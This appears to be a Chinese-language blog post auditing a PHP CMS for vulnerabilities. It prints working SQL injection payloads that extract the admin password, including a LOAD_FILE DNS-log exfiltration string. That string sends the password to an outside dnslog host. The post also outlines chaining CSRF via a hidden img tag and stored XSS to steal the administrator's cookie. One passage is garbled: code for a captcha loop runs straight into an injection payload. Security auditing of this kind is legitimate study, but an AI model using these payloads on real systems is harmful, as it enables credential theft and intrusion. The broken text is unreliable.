c_picture_d.php
c_picture_w.php
c_spage.php
我们看看关于我们这个板块吧detail.php玩意
这里居然有一句更新语句：sql_query(‘update cms_detail set d_hits = d_hits + 1 where id =
‘.$_GET[‘id’].”);
好吧这玩意感觉没用，但是如果能够跳出safe.php和魔术引号还有non_numeric_back($_GET[‘id’],’非法字符’);
再看看feedback.php这个文件
如果$_POST触发了Save 然后 接受了后插入数据库，然后我们看了下输入的数据会处理，clear_html函数进行处理。
clear_html() 进行好几步处理，第一步，strip_tags() 去除所有html标签， trim()移出空格 preg_replace()
替换掉\f\n\r\t\v 为空，
利用arrtoinsert这个自定义函数将$_data
这个数组进行处理，将数组转换为insert语句的字符串。前台留言似乎前台看不到，数据库f_ok来决定是否在前台展示。
在看看sitemap.php文件，也没用什么东西，我们只能去后台看看吧
访问admin文件夹，发现index.php直接跳转到cms_login.php
它包含了cms_inc.php
(这个文件包含了很多文件，其实就是最前面分析过的4个，conn.php、library.php、config.php、function.php)
然后它写了验证码的机制
$_SESSION[‘verifycode’] != $_POST[‘verifycode’] 会报验证码错误
验证码机制的核心是system下面的verifycode.php文件，开启了session 然后创建了画布，和颜色，然后通过一下代码生成验证码。
    $str = '0123456789';
    $rand_str = '';
    for ($i = 0; $i (SELECT COUNT(*),CONCAT(0x716b766b71,(SELECT MID((IFNULL(CAST(a_password AS CHAR),0x20)),1,54) FROM fr.cms_admin ORDER BY a_password),0x71767a6b71,FLOOR(RAND(0)*2))x FROM (SELECT 8439 UNION SELECT 7584 UNION SELECT 8267 UNION SELECT 7159)a GROUP BY x)
密码被炸出来了，感觉美滋滋
那么后台怎么炸？其实可以多考虑一点，如果存在CSRF的话我们可以用CSRF配合dns log注入。Dns
log注入语句构建完毕（有魔术引号怕啥，我有16进制）（这里要Mysql的 load_file可以用）
    http://192.168.32.138:80/admin/cms_channel.php?del=123456
    and LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT a_password from cms_admin limit
    0,1),0x2e6870307a79722e636579652e696f5c5c616263));
CSRF这个漏洞肯定存在，我到现在没有看到任何CSRF防护代码。
直接写一个img标签，然后藏在哪个网站首页，管理员去点击就中招
直接出密码了，这SQL注入还是有利用的意义的！！！
第二个漏洞，SQL注入
然后过了这块代码吧，del那个地方也是有问题的。
然后查看第22行的包含（没啥东西）
然后查看第25行和第64行的包含都没啥东西。
然后我们去看看其他文件吧
看看cms_admin.php文件
这个文件第8行又出现了这样的语句
这里是什么情况，这个确定不是再逗我么？
判断传参是否存在，传参存在就执行弹窗。传参不存在执行else部分。。。
这个地方写的很有问题。。。这个删除功能是失效的。
看到第30行
很明显，我们控制住a_tname传参就可以尝试SQL注入，我把这个代码单独拿了出来
很明显我们可以构建a_tname的传参就可以控制SQL注入。
    a_tname= bbb" and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1),1) --+
但是这有魔术引号，看来是不行了。
查看现有页面，发现输出
可以尝试存储型XSS
轻松的获取Cookie
依靠CSRF，可以直接打后台XSS偷取管理员的Cookie。
我们再看看cms_admin_edit.php文件
这里很明显有个id传参。这里应该可以SQL注入，我也就直接Sqlmap了吧
这个地方也可以配合CSRF+Dns log来获取密码
第40行也有问题
这里还能联合查询呢
## 0×03 总结
其实该CMS所存在的漏洞不仅仅只有这些，我文章中的这些也只是一个抛砖引玉，只是为了阐述通读全文的审计方法，如果我文章中有什么写的可以再改进的地方，可以随时联系我！谢谢大家花费了时间来读在下的粗鄙小文，谢谢大家。